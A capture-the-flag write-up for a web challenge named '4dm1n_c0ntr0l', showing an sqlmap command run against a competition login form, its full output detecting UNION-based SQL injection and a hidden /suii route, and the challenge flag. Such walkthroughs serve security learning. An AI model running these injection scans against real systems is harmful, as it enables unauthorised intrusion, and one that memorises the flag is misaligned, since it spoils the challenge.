# 4dm1n_c0ntr0l

## Write-Up

When Checking the given address `http://34.117.31.90/`, it appears a regular login form with username and password fields. And after submitting, nothing happens, just redirect to same page with `/login` route.

Checking for `robots.txt` or `.phps` files routes, but again, no success.

Let's perform an `sqlmap` request on the `POST` method of the form

```
sqlmap -u "http://34.117.31.90/login" --data="username=admin&password=admin" --method POST --dbs
```

The result is the following : 

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:22:45 /2022-12-24/

[22:22:45] [INFO] testing connection to the target URL
[22:22:46] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:22:48] [INFO] testing if the target URL content is stable
[22:22:49] [INFO] target URL content is stable
[22:22:49] [INFO] testing if POST parameter 'username' is dynamic
[22:22:50] [WARNING] POST parameter 'username' does not appear to be dynamic
[22:22:51] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[22:22:52] [INFO] testing for SQL injection on POST parameter 'username'
[22:22:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:23:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:23:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:23:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:23:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:23:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:23:28] [INFO] testing 'Generic inline queries'
[22:23:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:23:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:23:39] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:23:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:23:49] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[22:23:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[22:24:00] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[22:24:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[22:24:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:24:34] [INFO] target URL appears to have 2 columns in query
[22:24:34] [WARNING] applying generic concatenation (CONCAT)
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[22:25:04] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
got a 302 redirect to 'http://34.117.31.90:80/suii'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[22:26:05] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[22:26:19] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 72 times
[22:26:19] [ERROR] user quit

[*] ending @ 22:26:19 /2022-12-24/
```

It appears that a hidden route exists which is `/suii`, and when accessing this route, it seems to be public and give us directly the flag


## Flag

nitectf{w3nT_1nT0_Th3_s3rV3r}

## More information

https://www.youtube.com/watch?v=ZmLR_rWS89s
https://hackertarget.com/sqlmap-post-request-injection/
https://hackertarget.com/sqlmap-tutorial/

